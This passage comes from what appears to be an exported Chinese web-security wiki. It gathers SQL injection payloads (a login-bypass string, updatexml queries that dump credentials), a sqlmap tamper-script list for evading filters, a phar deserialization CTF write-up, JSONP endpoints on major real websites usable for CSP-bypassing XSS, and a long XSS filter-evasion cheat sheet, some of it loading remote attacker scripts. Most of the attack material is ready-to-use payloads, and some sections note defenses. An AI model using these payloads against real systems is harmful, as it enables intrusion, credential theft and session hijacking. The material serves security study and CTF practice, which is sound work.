post型盲注通杀payload： unameadmin%df’or()or%200%23passwdsubmitSubmit. 万能密码 �’or11# 关于UPDATEXML,REFERER,COOKIE的构造 User-Agent:……… or updatexml(1,concat(0x7e,database(),0x7e),1),”,”) #Referer: ’ or updatexml(1,concat(0x7e,database(),0x7e),1),”,”) #Cookie:username: admin ’ or updatexml(1,concat(0x7e,database(),0x7e),1) # updatexml报错注入 爆数据库版本信息：?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)链接用户：?id=1 and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)链接数据库：?id=1 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)爆库：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select schema_name),0x7e) FROM admin limit 0,1),0x7e),1)爆表：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select table_name),0x7e) FROM admin limit 0,1),0x7e),1)爆字段：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select column_name),0x7e) FROM admin limit 0,1),0x7e),1)爆字段内容：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1) 更新: 2025-09-06 13:59:44原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/6193425c3c9fbbeb60035d2be4de4324"},{"path":"/wiki/Web知识点/SQL注入/SQLMAP.html","content":"SQLMAP常用参数 -u --url 指定目标url -m 从文本中获取多个目标扫描 -r 从文件中加载HTTP请求 --data 以POST方式提交数据 -random-agent 随机ua --user-agent 指定ua --delay 设置请求间的延迟 --timeout 指定超时时间 --dbms 指定db，sqlmap支持的db有MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、SQLite等 --os 指定数据库服务器操作系统 --tamper 指定tamper --level 指定探测等级 --risk 指定风险等级 --technique ****注入技术 B: Boolean-based blind SQL injection E: Error-based SQL injection U: UNION query SQL injection S: Stacked queries SQL injection T: Time-based blind SQL injection 11.5.2. Tamper 速查 脚本名称 作用 apostrophemask.py 用utf8代替引号 equaltolike.py like 代替等号 space2dash.py 绕过过滤’’ 替换空格字符(“)，(‘’ - ‘)后跟一个破折号注释，一个随机字符串和一个新行(‘n’) greatest.py 绕过过滤’’ ,用GREATEST替换大于号。 space2hash.py 空格替换为#号 随机字符串 以及换行符 apostrophenullencode.py 绕过过滤双引号，替换字符和双引号。 halfversionedmorekeywords.py 当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论 space2morehash.py 空格替换为 #号 以及更多随机字符串 换行符 appendnullbyte.py 在有效负荷结束位置加载零字节字符编码 ifnull2ifisnull.py 绕过对 IFNULL 过滤。 替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’ space2mssqlblank.py 空格替换为其它空符号 base64encode.py 用base64编码替换 space2mssqlhash.py 替换空格 modsecurityversioned.py 过滤空格，包含完整的查询版本注释 space2mysqlblank.py 空格替换其它空白符号(mysql) between.py 用between替换大于号() space2mysqldash.py 替换空格字符(“)(‘ - ‘)后跟一个破折号注释一个新行(‘ n’) multiplespaces.py 围绕SQL关键字添加多个空格 space2plus.py 用+替换空格 bluecoat.py 代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换为like nonrecursivereplacement.py 取代predefined SQL关键字with表示 suitable for替代(例如 .replace(“SELECT”、””)) filters space2randomblank.py 代替空格字符(“”)从一个随机的空白字符可选字符的有效集 sp_password.py 追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾 chardoubleencode.py 双url编码(不处理以编码的) unionalltounion.py 替换UNION ALL SELECT UNION SELECT charencode.py url编码 randomcase.py 随机大小写 unmagicquotes.py 宽字符绕过 GPC addslashes randomcomments.py 用 /**/ 分割sql关键字 charunicodeencode.py 字符串unicode编码 securesphere.py 追加特制的字符串 versionedmorekeywords.py 注释绕过 space2comment.py Replaces space character with comments /**/ 更新: 2025-10-27 19:25:30原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/vgz35wgqb0nd0rfh"},{"path":"/wiki/WP/文件上传/phar文件上传绕过.html","content":"phar文件上传绕过什么是phar JAR是开发java程序一个应用，包括所有的可执行、可访问的文件都打包进了一个JAR文件里，使得部署过程十分简单。phar是php里类似与JAR的一种打包文件。对于PHP5.3或更高版本。Phar后缀文件是默认开启支持的，可以使用它。 Phar结构 stub:phar文件的标志，必须以 xxx __HALT_COMPILER();? 结尾，否则无法识别。xxx可以为自定义内容。 manifest:phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是漏洞利用最核心的地方。 content:被压缩文件的内容 signature (可空):签名，放在末尾。 注意：Phar协议解析文件时，会自动触发对manifest字段的序列化字符串进行反序列化 phar文件上传绕过的本质就是phar反序列化，只不过是需要文件上传点，这个条件是非常苛刻的，要对方存在文件上传，存在文件包含并且支持phar伪协议，存在反序列化漏洞。 直接看题吧 ?phphighlight_file(__FILE__);error_reporting(0);class TestObject public function __destruct() include(flag.php); echo $flag; #大致意思就是我们要反序列化触发__destruct()方法，就会输出flag$filename = $_POST[file];if (isset($filename)) echo md5_file($filename);//post接受一个文件名，如果存在会返回文件的md5值//upload.php 文件上传页面? 我这里不对代码进行过多的讲解了，看注释。 解题步骤：1.生成一个phar文件–2.在mate-data里放置一个包含TestObject()的序列号字符串–3.上传文件–4.md5_file执行phar伪协议，触发反序列化–5.反序列化TestObject()触发__destruck执行echo $flag 生成phar文件 ?phpclass TestObject@unlink(test.phar); //删除之前的test.par文件(如果有)$phar=new Phar(test.phar); //创建一个phar对象，文件名必须以phar为后缀$phar-startBuffering(); //开始写文件$phar-setStub(?php __HALT_COMPILER(); ?); //写入stub$o=new TestObject();$phar-setMetadata($o);//写入meta-data$phar-addFromString(test.txt,test); //添加要压缩的文件$phar-stopBuffering();? 我生成phar的环境使用的是 要在php.ini中修改在这个 然后访问文件，生成phar包，由于有对文件后缀进行白名单过滤，所有修改文件后缀伪jpg 上传文件 包含文件，读取flag 更新: 2025-09-06 15:37:28原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/f18a450f5052c7519403c79be97fd129"},{"path":"/wiki/Web知识点/xxe漏洞/xxe漏洞.html","content":"xxe漏洞xxe漏洞 更新: 2025-09-06 13:59:47原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/053708ddcb1a41e12495e54c8afb22f6"},{"path":"/wiki/Web知识点/xss/JSONP绕过.html","content":"JSONP 绕过Google.com script+src=https://googleads.g.doubleclick.net/pagead/conversion/1036918760/wcm?callback=alert(1337)/scriptscript+src=https://www.googleadservices.com/pagead/conversion/1070110417/wcm?callback=alert(1337)/scriptscript+src=https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=alert(1337)/scriptscript+src=https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)/scriptscript src=https://www.google.com/complete/search?client=chromeq=hellocallback=alert#1/script Blogger.com script src=https://www.blogger.com/feeds/5578653387562324002/posts/summary/4427562025302749269?callback=alert(1337)/scriptscript+src=https://www.blogger.com/feeds/5578653387562324002/posts/summary/4427562025302749269?callback=alert(1337)/script VK.com script+src=http://app-sjint.marketo.com/index.php/form/getKnownLead?callback=alert()/scriptscript+src=http://app-e.marketo.com/index.php/form/getKnownLead?callback=alert()/script AlibabaGroup script+src=https://detector.alicdn.com/2.7.3/index.php?callback=alert(1337)/scriptscript+src=https://suggest.taobao.com/sug?callback=alert(1337)/scriptscript+src=https://count.tbcdn.cn//counter3?callback=alert(1337)/scriptscript+src=https://bebezoo.1688.com/fragment/index.htm?callback=alert(1337)/scriptscript+src=https://wb.amap.com/channel.php?callback=alert(1337)/scriptscript+src=http://a.sm.cn/api/getgamehotboarddata?format=jsonppage=1_=1537365429621callback=confirm(1);jsonp1/scriptscript+src=http://api.m.sm.cn/rest?method=tools.sidercallback=jsonp_1869510867%3balert(1)%2f%2f794/script Uber.com “script+src”https://mkto.uber.com/index.php/form/getKnownLead?callback=alert(document.domain); AOLYahoo script+src=https://ads.yap.yahoo.com/nosdk/wj/v1/getAds.do?cb=alert(1337)/scriptscript+src=https://mempf.yahoo.co.jp/offer?position=hcallback=alert(1337)/scriptscript+src=https://suggest-shop.yahooapis.jp/Shopping/Suggest/V1/suggester?callback=alert(1)//appid=dj0zaiZpPVkwMDJ1RHlqOEdwdCZzPWNvbnN1bWVyc2VjcmV0Jng9M2Y-/scriptscript+src=https://www.aol.com/amp-proxy/api/finance-instruments/14.1.MSTATS_NYSE_L/?callback=confirm(9)//jQuery1120033838593671435757_1537274810388_=1537274810389/scriptscript+src=https://df-webservices.comet.aol.com/sigfig/ws?service=sigfig_portfoliosporttype=2portmax=5rf=http://www.dailyfinance.comcallback=jsonCallback24098%3balert(1)%2f%2f476_=1537149044679/scriptscript+src=https://api.cmi.aol.com/content/alert/homepage-alert?site=usaolcallback=confirm(1);//jQuery20108887725116629929_1528071050373472232_=1528071050374/scriptscript+src=https://api.cmi.aol.com/catalog/cms/help-central-usaol-navigation-utility?callback=confirm(1);//jQuery20108887725116629929_152807105037740504_=1528071050378/scriptscript+src=https://www.aol.com/amp-proxy/api/finance-instruments/14.1.MSTATS_NYSE_L/?callback=confirm(9)//jQuery1120033838593671435757_1537274810388_=1537274810389/scriptscript+src=https://ui.comet.aol.com/?module=header%7Cleftnav%7Cfooterchannel=financeportfolios=truedomain=portfolioscollapsed=1callback=confirm(9)//jQuery21307555521146732187_1538371213486_=1538371213487/scriptscript+src=http://portal.pf.aol.com/jsonmfus/?service=myportfolios,porttype=1portmax=100callback=confirm(9)//jQuery1710788849030856973_1538354104695_=1538354109053/script Twitter.com script+src=http://search.twitter.com/trends.json?callback=alert()/scriptscript+src=https://twitter.com/statuses/user_timeline/yakumo119info.json?callback=confirm()/scriptscript+src=https://twitter.com/status/user_timeline/kbeautysalon.json?count=1callback=confirm()/script Others script+src=https://www.sharethis.com/get-publisher-info.php?callback=alert(1337)/scriptscript+src=https://m.addthis.com/live/red_lojson/100eng.json?callback=alert(1337)/scriptscript+src=https://passport.ngs.ru/ajax/check?callback=alert(1337)/scriptscript+src=https://ulogin.ru/token.php?callback=alert(1337)/scriptscript+src=https://www.meteoprog.ua/data/weather/informer/Poltava.js?callback=alert(1337)/scriptscript+src=https://appcenter.intuit.com/Account/LogoutJSONP?callback=alert(1337)/scriptscript+src=https://api.userlike.com/api/chat/slot/proactive/?callback=alert(1337)/scriptscript+src=https://www.youku.com/index_cookielist/s/jsonp?callback=alert(1337)/scriptscript+src=https://api.mixpanel.com/track/?callback=alert(1337)/scriptscript+src=https://www.travelpayouts.com/widgets/50f53ce9ada1b54bcc000031.json?callback=alert(1337)/scriptscript+src=http://ads.pictela.net/a/proxy/shoplocal/alllistings/d5dadac1578db80a/citystatezip=10008;pd=40B5B0493316E5A3D4A389374BC5ED3ED8C7AB99817408B4EF64205A5B936BC45155806F9BF419E853D2FCD810781C;promotioncode=Petco-140928;sortby=23;listingimageflag=y;listingimagewidth=300;resultset=full;listingcount=100;;callback=alert(1);/json/scriptscript+src=https://adserver.adtechus.com/pubapi/3.0/9857.1/3792195/0/170/ADTECH;noperf=1;cmd=bid;bidfloor=0.12;callback=confirm(1);//window.proper_d31c1edc_57a8d6de_38/script#GoogleAPIsembed src=//ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain=\\)))catch(e)alert(1337)// allowscriptaccess=alwaysscript src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337/scriptng-appng-csp ng-click=$event.view.alert(1337)script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js/script#Yandex:script+src=https://translate.yandex.net/api/v1.5/tr.json/detect?callback=alert(1337)/scriptscript+src=https://api-metrika.yandex.ru/management/v1/counter/1/operation/1?callback=alert/script 更新: 2025-10-29 21:10:16原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/gafr9v1lugv9t89x"},{"path":"/wiki/Web知识点/工具指南/kali操作.html","content":"kali操作kali操作 切换rootsudo passwd rootssh连接ssh_configP有关的sshd_config两个P有关的 更新源sudo vim etcaptsources.listdeb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib更新 apt-get update apt-get upgradeapt-get dist-upgradeapt-get clean 安装vim 更新: 2025-09-06 13:59:48原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/33450fc3e05d1bbdb770e206c20f8855"},{"path":"/wiki/Web知识点/xss/xss绕过.html","content":"xss绕过XSS绕过总结一、分类反射性XSS存储型XSSDOM型XSS 反射型xss 攻击方式 攻击者通过电子邮件等方式将包含XSS代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接受该目标用户的请求并进行处理，然后服务器把带有XSS的代码发送给目标用户的浏览器，浏览器解析这段带有XSS代码的恶意脚本后，就会触发XSS漏洞。 攻击步骤 1.攻击者构造出特殊的URL，其中包含恶意代码.2.用户打开有恶意代码的URL时，网站服务器端将恶意代码从URL取出，拼接在HTML返回给浏览器.3.用户浏览器接收到响应后解析执行，混在其中的恶意代码也会被执行。4.恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户行为，调用目标网站接口执行攻击者指定的操作。 防御反射型攻击 1.对输入检查对请求参数进行检查，一旦发现可疑的特殊字符就拒绝请求。需要注意的是用户可以绕过浏览器的检查，直接通过Postman等工具进行请求，所以这个检查最好前后端都做。2.对输出进行转义再显示通过上面的介绍可以看出，反射型XSS攻击要进行攻击的话需要在前端页面进行显示。所以在输出数据之前对潜在的威胁的字符进行编码、转义也是防御XSS攻击十分有效的措施。 存储型xss 攻击方式 攻击者在发帖、留言、评论的过程中，将恶意脚本连同正常信息一起注入到发布内容中。随着发布内容被服务器存储下来，恶意脚本也将永久的存放到服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本就会在用户的浏览器中得到执行。 攻击步骤 1.攻击者将恶意代码提交到目标网站的数据库中。2.用户打开目标网站时，网站服务端将恶意代码从数据库中取出，拼接在HTML中返回给浏览器。3.用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。4.恶意代码窃取用户数据并发送到攻击者的网站，或冒充用户行为，凋用目标网站接口执行攻击者指定的操作.这种攻击常见于带有用户保存数据的网站功能，如论坛发帖，商品评论，用户私信等。 预防存储型XSS攻击 预防存储型XSS攻击也是从输入和输出两个方面来考虑。1.服务器接收到数据，在存储到数据库之前，进行转义和过滤危险字符;2.前端接收到服务器传递过来的数据，在展示到页面前，先进行转义/过滤;不论是反射型攻击还是存储型，攻击者总需要找到两个要点，即“输入点”与输出点，也只有这两者都满足，XSS攻击才会生效。“输入点”用于向 web页面注入所需的攻击代码，而“输出点”就是攻击代码被执行的地方。 DOM型xss 攻击方式 用户请求一个经过专门设计的URL，它由攻击者提供，而且其中包含XSS代码。服务器的响应不会以任何形式包含攻击者的脚本，当用户的浏览器处理这个响应时，DOM对象就会处理XSS代码，导致存在XSS漏洞。/*DOM(Document object model)，使用DOM能够使程序和脚本能够动态访问和更新文档的内容、结构和样式。DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象的一种漏洞。DOM型XSS是基于js上的，不需要与服务器进行交互。*/ 攻击步骤 1.攻击者构造出特殊数据，其中包含恶意代码。2.用户浏览器执行了恶意代码3.恶意窃取用户数据并发送到攻击者的网站，或冒充用户行为，调用目标网站接口执行攻击者指定的操作./*DOM型XSS攻击中，取出和执行恶意代码由浏览器端完成，属于前端javascript自身的安全漏洞.*/ 其他防范策略 HTTP-only Cookie:禁止JavaScript读取某些敏感Cookie，攻击者完成XSS注入后也无法窃取此Cookie属性：防止脚本冒充用户提交危险操作 在服务端使用HTTP的Content-Security-Policy头部来指定策略，或者在前端设置meta标答。例如只允许加载同域下的资源 应对XSS攻击的主要手段还是编码与过滤两种，编码用于将特殊的符号 “、、、’、””进行html转义，而过滤则是阻止特定的标记、属性、事件。 二、攻击荷载alert prompt prompt(1) 会弹输入框，点确定即算执行 confirm confirm(1) 弹确定取消框 open open(javascript:alert(1)) 既弹窗又能加载伪协议 print print() 调出打印对话框（部分浏览器） script标签script 标签用于定义客户端脚本scriptalert(xss)/script scriptalert(/xss/)/script scriptalert(document.cookie)/script script src=http://xxx.com/xss.js/script svg标签svg 标签用来在HTML页面中直接嵌入SVG 文件的代码。 // 等价于 svg onload=alert(xss)svg onload=alert(xss)// img标签img 标签定义 HTML 页面中的图像img src=1 onerror=alert(xss)img src=1 onerror=alert(document.cookie)img src=1 onerror=eval(alert(xss))img src=javascript:alert(xss)img src=javascript:alert(String.formCharCode(88,83,83))img src=1 onmouseover=alert(xss) body标签body 标签定义文档的主体。body onload=alert(xss)body onpageshow=alert(xss) video标签video 标签定义视频，比如电影片段或其他视频流。videosource onerror=alert(1)videosource onerror=alert(xss);/videovideo controls onmouseover=alert(xss);/videovideo controls onfocus=alert(xss); autofocus=/videovideo controls onclick=alert(xss);/video style标签style 标签定义 HTML 文档的样式信息。style onload=alert(1)/style input标签input标签规定了用户可以在其中输入数据的输入字段。点击输入框触发input onfocus=alert(1);input value= onclick=alert(xss) type=textinput name=name value=onmouseover=prompt(xss) bad=input name=name value=scriptalert(xss)/scriptinput onblur=alert(1) autofocusinput autofocusinput onfocus=alert(1); autofocus details 标签details 标签通过提供用户开启关闭的交互式控件，规定了用户可见的或者隐藏的需求的补充细节。details ontoggle=alert(1);details open ontoggle=alert(1); select 标签select 标签用来创建下拉列表。select onfocus=alert(1)/selectselect onfocus=alert(1) autofocus iframe 标签iframe 标签会创建包含另外一个文档的内联框架 iframe onload=alert(1);/iframe audio 标签audio 标签定义声音，比如音乐或其他音频流。audio src=x onerror=alert(1); textarea 标签`textarea` 标签定义一个多行的文本输入控件。textarea onfocus=alert(1); autofocus marquee 标签marquee onstart=alert(1)/marquee //Chrome不行，火狐和IE都可以 isindex 标签isindex type=image src=1 onerror=alert(1)//仅限于IE link 标签link 标签定义文档与外部资源的关系。在无CSP的情况下才可以使用： link rel=import href=http://47.xxx.xxx.72/evil.js a 标签a href=javascript:alert(1);xss/aa href=x onclick=eval(alert(xss);)xss/aa href=x onmouseover=alert(xss);xss/aa href=x onmouseout=alert(xss);xss/a form标签form action=Javascript:alert(1)input type=submitform method=x action=x onmouseover=alert(xss);input type=submit/form button标签button onclick=alert(1)button onfocus=alert(xss); autofocus=xss/buttonbutton onclick=alert(xss);xss/buttonbutton onmouseover=alert(xss);xss/buttonbutton onmouseout=alert(xss);xss/buttonbutton onmouseup=alert(xss);xss/buttonbutton onmousedown=alert(xss);/button div标签这个需要借助url编码来实现绕过原代码：div onmouseover=alert(1)DIV/div经过url编码：div onmouseover%3dalert%26lpar%3b1%26rpar%3bDIV%2fdiv object标签这个需要借助 data 伪协议和 base64 编码来实现绕过object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=/object p标签p onclick=alert(xss);xss/pp onmouseover=alert(xss);xss/pp onmouseout=alert(xss);xss/pp onmouseup=alert(xss);xss/p 三、绕过思路过滤 危险字符 “ ‘ 绕过空格过滤当空格被过滤了时，我们可以用 / 来代替空格： img/src=x/onerror=alert(1); 空格回车Tab绕过主要和正则对抗空格：img src= javascript:alert(9527); TAB： img src= javasc :ript:alert(9528); 回车： img src= javascript:alert(xss); 绕过引号过滤如果是html标签中，我们可以不用引号。如果是在js中，我们可以用反引号代替单双引号： img src=x onerror=alert(`xss`); 绕过括号过滤当括号被过滤的时候可以使用throw来绕过。throw 语句用于当错误发生时抛出一个错误。 img src=x onerror=javascript:window.onerror=alert;throw 1a onmouseover=javascript:window.onerror=alert;throw 1 绕过关键字过滤大小写绕过sCRiPtalert(1);/sCrIpTImG sRc=x onerRor=alert(1); 双写绕过有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过 scrscriptiptalert(1);/scrscriptiptimimgg srsrcc=x onerror=alert(1); 字符串拼接绕过利用eval()函数 与PHP的eval()函数相同，JavaScript的eval()函数也可以计算 JavaScript 字符串，并把它作为脚本代码来执行。 img src=x onerror=a=aler;b=t;c=(1);eval(a+b+c)img src=x onerror=a=`aler`;b=`t`;c=(`xss`);;eval(a+b+c)!--在js中，我们可以用反引号代替单双引号-- 利用top scripttop[al+ert](`xss`);/scriptscripttop[al+ert](xss);/script 拆分法当 Web 应用程序对目标用户的输入长度进行了限制时，这时无法注入较长的xss攻击向量，但是特定情况下，这种限制可以通过拆分法注入的方式进行绕过 scripta=document.write(/scriptscripta=a+script src=ht/scriptscripta=a+tp://note163.com/xs/scriptscripta=a+s.js/script)/scriptscripteval(a)/script/*document.write(script src = http://note163.com/xss.js/script)*/ 上传文件构造xss上传普通文件更改文件名为xss语句 .gifpng 编码绕过浏览器整个解析顺序为3个环节：HTML实体解码 —URL解码 —JS解码（只支持Unicode） HTML 实体编码我们可以将DOM节点中的内容转化为HTML实体，因为解析HTML之后建立起节点，然后会对DOM节点里面的HTML实体进行解析。HTML 编码主要分为10进制和16进制，格式为以 # 开头以分号 ; 结尾（也可以不带分号）。 !--a href=javascript:alert(xss)test\\/a--!--十进制--a href=#106;#97;#118;#97;#115;#99;#114;#105;#112;#116;#58;#97;#108;#101;#114;#116;#40;#34;#120;#115;#115;#34;#41;test/a !--十六进制--a href=#x6A;#x61;#x76;#x61;#x73;#x63;#x72;#x69;#x70;#x74;#x3A;#x61;#x6C;#x65;#x72;#x74;#x28;#x22;#x78;#x73;#x73;#x22;#x29;test/a !--也可以不带分号--a href=#x6A#x61#x76#x61#x73#x63#x72#x69#x70#x74#x3A#x61#x6C#x65#x72#x74#x28#x22#x78#x73#x73#x22#x29test/a!--img src=x onerror=alert(xss)--!--十进制--img src=x onerror=#97;#108;#101;#114;#116;#40;#34;#120;#115;#115;#34;#41; !--十六进制--img src=x onerror=#x61;#x6C;#x65;#x72;#x74;#x28;#x22;#x78;#x73;#x73;#x22;#x29; !--也可以不带分号--img src=x onerror=#x61#x6C#x65#x72#x74#x28#x22#x78#x73#x73#x22#x29 HTML字符实体，并不是说任何地方都可以使用实体编码，只有处于 “数据状态中的字符引用”、“属性值状态中的字符引用” 和 “RCDATA状态中的字符引用” 这三种状态中的HTML字符实体将会从 #… 形式解码，转化成对应的解码字符并被放入数据缓冲区中。 一个HTML解析器作为一个状态机，它从输入流中获取字符并按照转换规则转换到另一种状态。在解析过程中，任何时候它只要遇到一个 符号（后面没有跟 符号）就会进入 标签开始状态(Tag open state) ，然后转变到 标签名状态(Tag name state) 、 前属性名状态(before attribute name state) ……最后进入 数据状态(Data state) 并释放当前标签的token。当解析器处于数据状态(Data state) 时，它会继续解析，每当发现一个完整的标签，就会释放出一个token。 简单的说就是，浏览器对HTML解码之后就开始解析HTML文档，将众多标签转化为内容树中的DOM节点，此时识别标签的时候，HTML解析器是无法识别那些被实体编码的内容的，只有建立起DOM树，才能对每个节点的内容进行识别，如果出现实体编码，则会进行实体解码，只要是DOM节点里属性的值，都可以被HTML编码和解析。 **数据状态中的字符引用：**数据状态就是解析一个标签内里面的内容，如 div.../div 中的内容，当浏览器解析完 div 标签之后如果发现标签内还含有实体字符的话，就会有一个实体编码解析了 **属性值状态中的字符引用：**属性值状态中的字符引用就好理解了，就是src，herf这样的属性值中的HTML实体，他也是会先进行HTML解码的。 RCDATA状态中的字符引用：然后再来看一下什么是RCDATA转态，这里需要我们先了解一下HTML中有五类元素： 空元素(Void elements)，如 area、br、base 等等。空元素不能容纳任何内容，因为它们没有闭合标签，没有内容能够放在开始标签和闭合标签中间。 原始文本元素(Raw text elements)，有 script 和 style。原始文本元素可以容纳文本。 RCDATA元素(RCDATA elements)，有 textarea 和 title。RCDATA元素可以容纳文本和字符引用。 外部元素(Foreign elements)，例如MathML命名空间或者SVG命名空间的元素。外部元素可以容纳文本、字符引用、CDATA段、其他元素和注释。 基本元素(Normal elements)，即除了以上4种元素以外的元素。基本元素可以容纳文本、字符引用、其他元素和注释。 注意到RCDATA元素中有 textarea 和 title 两个属性并且有字符引用，也就是当实体字符出现在这两个标签里面的时候，实体字符会被识别并进行HTML编码解析。这里要再提醒一次，在解析这些字符引用的过程中不会进入“标签开始状态”，所以就不会建立新的标签，所以HTML编码的XSS语句触发不了XSS。 HTML的五类元素中，像 script、style 这样的原始文本元素在这个标签内容纳的是文本，所以浏览器在解析到这个标签后，里面内容中的HTML编码并不会被认为是HTML实体引用，所以并不会被解码为相应的字符,不会触发语句原有的结果。但是当在前面加上 svg ，即可成功弹窗。 URL编码我们可以并将src或href属性中的内容进行URL编码，当HTML解析器对src或href中的字符完成HTML解码后，接下来URL解析器会对src或href中的值进行URL解码。 a href=javascript:alert(xss)test/aa href=javascript:%61%6c%65%72%74%28%22%78%73%73%22%29test/aiframe src=javascript:alert(xss)/iframeiframe src=javascript:%61%6c%65%72%74%28%22%78%73%73%22%29/iframe!--伪协议头 javascript: 是不能进行编码的。这里就有一个URL解析过程中的一个细节了，即不能对协议类型进行任何的编码操作，否则URL解析器会认为它无类型，就会导致DOM节点中被编码的“javascript”没有被解码，当然不会被URL解析器识别了。如：http://www.baidu.com 可以被URL编码为 http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d，但是不能把协议也进URL编码：%68%74%74%70%3a%2f%2f%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d但是伪协议头 javascript: 可以进行HTML编码。-- Javascript 编码我们可以将DOM节点中的内容转化为 Javascript 编码。当HTML解析产生DOM节点后，会根据DOM节点来做接下来的解析工作，比如在处理诸如 script、style 这样的标签时，解析器会自动切换到JavaScript解析模式，而 src、 href 后边加入的 javascript 伪URL，也会进入 JavaScript 的解析模式。Javascript 中可以识别的编码类型有： Unicode 编码 八进制编码 十六进制编码 Unicode编码的比较广泛，而八进制和十六进制只有在DOM环境或eval()等函数中才可以用。 Unicode 编码scriptalert(xss)/scriptscript\\u0061\\u006C\\u0065\\u0072\\u0074(xss)/scriptscript\\u0061\\u006C\\u0065\\u0072\\u0074(\\u0078\\u0073\\u0073)/scripta href=javascript:alert(xss)test/aa href=javascript:\\u0061\\u006C\\u0065\\u0072\\u0074(xss)test/aa href=javascript:\\u0061\\u006C\\u0065\\u0072\\u0074(\\u0078\\u0073\\u0073)test/a!--不能对伪协议头 javascript: 进行 Javascript 编码。并且像圆括号、双引号、单引号这样的符号我们也不能进 Javascript 编码，但是能进行HTML编码。-- 在DOM环境中的JavaScript编码对于八进制编码和十六进制编码，与 Unicode 编码还是有区别，要想让他们能够执行我们要将他们放在DOM环境中scriptalert(xss)/scriptscript\\141\\154\\145\\162\\164(xss)/scripta href=javascript:alert(xss)test/aa href=javascript:\\x61\\x6c\\x65\\x72\\x74(xss)test/a!--如果过滤了 、、、、、% 等等这些字符的话，我们便可以用JavaScript编码的方法将XSS语句全部编码--即 iframe src=javascript:alert(xss)/iframe 的以下编码都可以弹窗：!--Unicode编码--\\u003C\\u0069\\u0066\\u0072\\u0061\\u006D\\u0065\\u0020\\u0073\\u0072\\u0063\\u003D\\u006A\\u0061\\u0076\\u0061\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003A\\u0061\\u006C\\u0065\\u0072\\u0074\\u0028\\u0027\\u0078\\u0073\\u0073\\u0027\\u0029\\u003E\\u003C\\u002F\\u0069\\u0066\\u0072\\u0061\\u006D\\u0065\\u003E!--八进制编码--\\74\\151\\146\\162\\141\\155\\145\\40\\163\\162\\143\\75\\152\\141\\166\\141\\163\\143\\162\\151\\160\\164\\72\\141\\154\\145\\162\\164\\50\\47\\170\\163\\163\\47\\51\\76\\74\\57\\151\\146\\162\\141\\155\\145\\76!--十六进制编码--\\x3c\\x69\\x66\\x72\\x61\\x6d\\x65\\x20\\x73\\x72\\x63\\x3d\\x6a\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x3a\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x78\\x73\\x73\\x27\\x29\\x3e\\x3c\\x2f\\x69\\x66\\x72\\x61\\x6d\\x65\\x3e 另一种弹窗的方法scriptalert(xss)/scriptscripteval(\\141\\154\\145\\162\\164\\50\\42\\170\\163\\163\\42\\51)/scripta href=javascript:alert(xss)test/aa href=javascript:eval(\\x61\\x6c\\x65\\x72\\x74\\x28\\x22\\x78\\x73\\x73\\x22\\x29)test/aimg src=x onerror=alert(xss)img src=x onerror=eval(\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x78\\x73\\x73\\x27\\x29) 混合编码a href=javascript:alert(xss)test/a首先对“alert”进行JavaScript Unicode编码：a href=javascript:\\u0061\\u006C\\u0065\\u0072\\u0074(xss)test/a然后再对 \\u0061\\u006c\\u0065\\u0072\\u0074 进行URL编码：a href=javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(xss)test/a最后对标签中的 javascript:%5c%75...%37%34(xss) 整体进行HTML编码即可： svga 